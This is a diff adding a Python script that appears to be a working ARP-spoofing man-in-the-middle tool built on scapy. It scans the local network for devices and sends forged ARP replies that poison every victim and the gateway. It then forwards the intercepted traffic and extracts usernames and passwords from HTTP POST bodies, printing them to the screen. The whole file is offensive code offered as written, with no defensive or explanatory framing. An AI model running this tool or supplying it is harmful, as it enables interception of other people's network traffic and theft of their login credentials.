@@ -1,0 +1,66 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+import netifaces
+import string
+from ipaddress import IPv4Network
+
+def process_packet(pkt):
+	if pkt.haslayer('Raw'):
+		if str(pkt[Raw].load).find('POST') > 0:
+			payload = str(pkt[Raw].load)
+			usr = payload[payload.find('usr=')+4:-1].split('&')[0]
+			pwd = payload[payload.find('pwd=')+4:-1].split('&')[0]
+			print("username: " + usr + " password: " + pwd)  
+	if pkt.haslayer('IP'): 
+		if pkt[IP].dst in list(ip_mac):
+			pkt[Ether].dst = ip_mac[pkt[IP].dst]
+			pkt[Ether].src = own_mac
+		else:
+			pkt[Ether].dst = getway_macaddress
+			pkt[Ether].src = own_mac
+		if len(str(pkt)) < 4096:
+			sendp(pkt, verbose=False)
+
+interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
+
+cidr = IPv4Network('0.0.0.0/' + netmask).prefixlen
+own_ip = get_if_addr(interface)
+own_mac = get_if_hwaddr(interface)
+
+getway_ip = conf.route.route("0.0.0.0")[2]
+network = own_ip + '/' + str(cidr)
+getway_macaddress = ''
+print('Available devices')
+print('-----------------------------------------')
+print('IP\t\t\tMac Address')
+print('-----------------------------------------')
+ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=network), timeout=2, verbose=False)
+ip_mac = {}
+for send, rcv in ans:
+	ip_mac[rcv.sprintf("%ARP.psrc%")] = rcv.sprintf("%Ether.src%")
+	if rcv.sprintf("%ARP.psrc%") != getway_ip:
+		print(rcv.sprintf("%ARP.psrc%\t\t%Ether.src%"))
+	if rcv.sprintf("%ARP.psrc%") == getway_ip:
+		getway_macaddress = rcv.sprintf("%Ether.src%")
+
+for send, rcv in ans:
+	victim_ip = rcv.sprintf("%ARP.psrc%")
+	victim_macaddress = rcv.sprintf("%Ether.src%")
+	if victim_ip != getway_ip:
+		arp_response = Ether(src=own_mac, dst=victim_macaddress, type=2054)/ARP(hwdst=victim_macaddress, ptype=2048, hwtype=1, psrc=getway_ip, hwlen=6, plen=4, pdst=victim_ip, hwsrc=own_mac, op=2)
+		sendp(arp_response, verbose=False)
+		arp_response = Ether(src=own_mac, dst=getway_macaddress, type=2054)/ARP(hwdst=getway_macaddress, ptype=2048, hwtype=1, psrc=victim_ip, hwlen=6, plen=4, pdst=getway_ip, hwsrc=own_mac, op=2)
+		sendp(arp_response, verbose=False)
+while True:
+	sniff(prn=process_packet, count = 1, store = 0)
+	
+		
+
+
+
+
+
+
+ 
